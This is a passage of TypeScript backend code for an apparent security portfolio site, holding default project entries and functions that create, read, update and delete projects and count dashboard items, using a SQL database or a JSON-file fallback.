    description: "Researched and developed a prototype cryptographic system using quantum-resistant key exchange protocols to secure communications against post-quantum threats.",
    link: "",
    tags: ["cryptography", "quantum", "research"],
    date: "2025-02-01",
    createdAt: "2025-02-01T00:00:00Z",
    updatedAt: "2025-02-01T00:00:00Z",
  },
  {
    id: "p2",
    title: "Secure Network Architecture with VPN",
    description: "Designed and implemented a secure network architecture with VPN integration, advanced routing protocols, and intrusion detection systems.",
    link: "",
    tags: ["networking", "VPN", "architecture"],
    date: "2024-11-15",
    createdAt: "2024-11-15T00:00:00Z",
    updatedAt: "2024-11-15T00:00:00Z",
  },
  {
    id: "p3",
    title: "Malware Analysis & Exploit Development",
    description: "Static and dynamic malware analysis with vulnerability research and exploit development for educational purposes in controlled environments.",
    link: "",
    tags: ["malware", "exploit-dev", "analysis"],
    date: "2024-08-20",
    createdAt: "2024-08-20T00:00:00Z",
    updatedAt: "2024-08-20T00:00:00Z",
  },
]

export async function getProjects(): Promise<Project[]> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const rows = await sql`SELECT * FROM projects ORDER BY created_at DESC` as Record<string, unknown>[]
    return (rows as { tags: string; created_at: string; updated_at: string; [k: string]: unknown }[]).map((r) => ({
      id: r.id as string, title: r.title as string, description: r.description as string,
      link: r.link as string, tags: typeof r.tags === "string" ? JSON.parse(r.tags) : r.tags,
      date: r.date as string, createdAt: r.created_at as string, updatedAt: r.updated_at as string,
    }))
  }
  return readFile<Project[]>("projects.json", defaultProjects)
}

export async function getProjectById(id: string): Promise<Project | null> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const rows = await sql`SELECT * FROM projects WHERE id = ${id}` as Record<string, unknown>[]
    if (rows.length === 0) return null
    const r = rows[0] as { tags: string; created_at: string; updated_at: string; [k: string]: unknown }
    return {
      id: r.id as string, title: r.title as string, description: r.description as string,
      link: r.link as string, tags: typeof r.tags === "string" ? JSON.parse(r.tags) : r.tags,
      date: r.date as string, createdAt: r.created_at as string, updatedAt: r.updated_at as string,
    }
  }
  const projects = await getProjects()
  return projects.find((p) => p.id === id) || null
}

export async function createProject(data: Omit<Project, "id" | "createdAt" | "updatedAt">): Promise<Project> {
  const now = new Date().toISOString()
  const id = "p" + String(Date.now())
  const sql = getSql()
  if (sql) {
    await initDatabase()
    await sql`INSERT INTO projects (id, title, description, link, tags, date, created_at, updated_at) VALUES (${id}, ${data.title}, ${data.description}, ${data.link}, ${JSON.stringify(data.tags)}, ${data.date}, ${now}, ${now})`
    return { ...data, id, createdAt: now, updatedAt: now }
  }
  const projects = await getProjects()
  const np: Project = { ...data, id, createdAt: now, updatedAt: now } as Project
  projects.push(np)
  await writeFile("projects.json", projects)
  return np
}

export async function updateProject(id: string, updates: Partial<Project>): Promise<Project | null> {
  const now = new Date().toISOString()
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const existing = await getProjectById(id)
    if (!existing) return null
    const merged = { ...existing, ...updates, updatedAt: now }
    await sql`UPDATE projects SET title = ${merged.title}, description = ${merged.description}, link = ${merged.link}, tags = ${JSON.stringify(merged.tags)}, date = ${merged.date}, updated_at = ${now} WHERE id = ${id}`
    return merged
  }
  const projects = await getProjects()
  const index = projects.findIndex((p) => p.id === id)
  if (index === -1) return null
  projects[index] = { ...projects[index], ...updates, id: projects[index].id, updatedAt: now }
  await writeFile("projects.json", projects)
  return projects[index]
}

export async function deleteProject(id: string): Promise<boolean> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    await sql`DELETE FROM projects WHERE id = ${id}`
    return true
  }
  const projects = await getProjects()
  const index = projects.findIndex((p) => p.id === id)
  if (index === -1) return false
  projects.splice(index, 1)
  await writeFile("projects.json", projects)
  return true
}

// ---- Dashboard Stats ----

export interface DashboardStats {
  blog: number
  writeups: number
  projects: number
  gallery: number
  messages: number
}

export async function getDashboardStats(): Promise<DashboardStats> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const results = await Promise.all([
      sql`SELECT COUNT(*)::int AS count FROM blog`,
      sql`SELECT COUNT(*)::int AS count FROM writeups`,
      sql`SELECT COUNT(*)::int AS count FROM projects`,
      sql`SELECT COUNT(*)::int AS count FROM gallery`,
      sql`SELECT COUNT(*)::int AS count FROM messages`,
    ]) as unknown as [Record<string, unknown>[], Record<string, unknown>[], Record<string, unknown>[], Record<string, unknown>[], Record<string, unknown>[]]
    const [b, w, p, g, m] = results
    return {
      blog: (b[0] as { count: number }).count,
      writeups: (w[0] as { count: number }).count,
      projects: (p[0] as { count: number }).count,
      gallery: (g[0] as { count: number }).count,
      messages: (m[0] as { count: number }).count,
    }
  }
  const [blogPosts, writeups, projects, gallery, messages] = await Promise.all([
    getBlogPosts(),
    getWriteups(),
    getProjects(),
    getGallery(),
    getMessages(),
  ])
  return {
    blog: blogPosts.length,
    writeups: writeups.length,
    projects: projects.length,
    gallery: gallery.length,
    messages: messages.length,
  }
}
